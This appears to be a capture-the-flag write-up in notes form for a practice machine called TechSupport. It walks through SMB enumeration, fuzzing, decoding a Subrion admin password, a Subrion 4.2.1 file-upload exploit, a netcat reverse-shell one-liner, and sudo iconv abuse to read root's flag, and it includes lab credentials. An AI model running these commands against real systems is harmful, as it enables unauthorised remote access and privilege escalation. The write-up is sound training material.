---
aliases: []
sticker: emoji//1f469-200d-1f4bb
---
# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |
| 139 | SMB |
| 445 | SMB |



# RECONNAISSANCE
---

We got `smb` enabled, let's try anonymous login:

![Pasted image 20250411151007.png](../../IMAGES/Pasted%20image%2020250411151007.png)

There we go, we got an interesting share, let's check the contents inside of it:

![Pasted image 20250411151101.png](../../IMAGES/Pasted%20image%2020250411151101.png)

We got something called `enter.txt`, let's read the contents:

```
cat enter.txt

GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

We got credentials for the WordPress site, let's check the website:


![Pasted image 20250411151659.png](../../IMAGES/Pasted%20image%2020250411151659.png)

We can fuzz and we find this:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.224.191/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.224.191/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

wordpress [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 165ms]
test [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 161ms]
```


If we check the `test` directory, we can see this:

![Pasted image 20250411151834.png](../../IMAGES/Pasted%20image%2020250411151834.png)


In the `wordpress` directory, we can go to `wp-login.php` and test the credentials we got earlier:

```
admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
```


![Pasted image 20250411152301.png](../../IMAGES/Pasted%20image%2020250411152301.png)

They don't work, seems like they are not the credentials for WordPress, other stuff we are missing is the `/subrion` directory, if we try accessing it we get this:


![Pasted image 20250411152549.png](../../IMAGES/Pasted%20image%2020250411152549.png)

There's a redirection, if we follow it:

![Pasted image 20250411152610.png](../../IMAGES/Pasted%20image%2020250411152610.png)

It changes the host, seems weird, what if we try changing it back to the real host:

![Pasted image 20250411152727.png](../../IMAGES/Pasted%20image%2020250411152727.png)

No response still, seems like we are trying to access an invalid resource, maybe `/subrion/subrion` does not exist, we can try reading `robots.txt` and check if it works, let's change it in the base request:

![Pasted image 20250411153009.png](../../IMAGES/Pasted%20image%2020250411153009.png)

There we go, it does exist, we got some stuff:

```
User-agent: *
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```


If we remember the message from `smb`, we can go inside of `panel` and edit the `/subrion` directory, which could mean we can use these credentials inside of the panel:

![Pasted image 20250411153208.png](../../IMAGES/Pasted%20image%2020250411153208.png)


```
admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
```

But wait, there is something that needs to be done with these still, let's proceed to exploitation.



# EXPLOITATION
---

```
Subrion creds

admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]

```


Let's use CyberChef with the `magic` operation, we can see the following:



![Pasted image 20250411153349.png](../../IMAGES/Pasted%20image%2020250411153349.png)

There we go, we got the real password:

```
admin:Scam2021
```


![Pasted image 20250411153512.png](../../IMAGES/Pasted%20image%2020250411153512.png)

There we go, we got inside of the panel, let's check for an exploit regarding this version of `subrion`, we are dealing with `subrion 4.2.1`:

![Pasted image 20250411153614.png](../../IMAGES/Pasted%20image%2020250411153614.png)

We got `Arbitrary File Upload`, the module is on `metasploit` so we can use it to ensure it works:

![Pasted image 20250411154612.png](../../IMAGES/Pasted%20image%2020250411154612.png)

There we go, we got the shell, we can migrate to `netcat` 

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 9001 >/tmp/f
```


![Pasted image 20250411154740.png](../../IMAGES/Pasted%20image%2020250411154740.png)

There we go, we got our netcat shell, let's proceed with privilege escalation.



# PRIVILEGE ESCALATION
---

Let's stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250411154905.png](../../IMAGES/Pasted%20image%2020250411154905.png)

If we use linpeas, we can see this:

![Pasted image 20250411155553.png](../../IMAGES/Pasted%20image%2020250411155553.png)

![Pasted image 20250411155606.png](../../IMAGES/Pasted%20image%2020250411155606.png)


```
scamsite:ImAScammerLOL!123!
```

Let's use this credentials in ssh:

![Pasted image 20250411155627.png](../../IMAGES/Pasted%20image%2020250411155627.png)

Let's check our sudo privileges:

```
scamsite@TechSupport:~$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
 (ALL) NOPASSWD: /usr/bin/iconv
```

We can run `iconv`, let's check it on GTFOBins:

![Pasted image 20250411155740.png](../../IMAGES/Pasted%20image%2020250411155740.png)

Nice, let's read `root.txt`:


```
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/root.txt
```

![Pasted image 20250411160756.png](../../IMAGES/Pasted%20image%2020250411160756.png)
```
scamsite@TechSupport:~$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/root.txt
851b8233a8c09400ec30651bd1529bf1ed02790b
```

![Pasted image 20250411160820.png](../../IMAGES/Pasted%20image%2020250411160820.png)

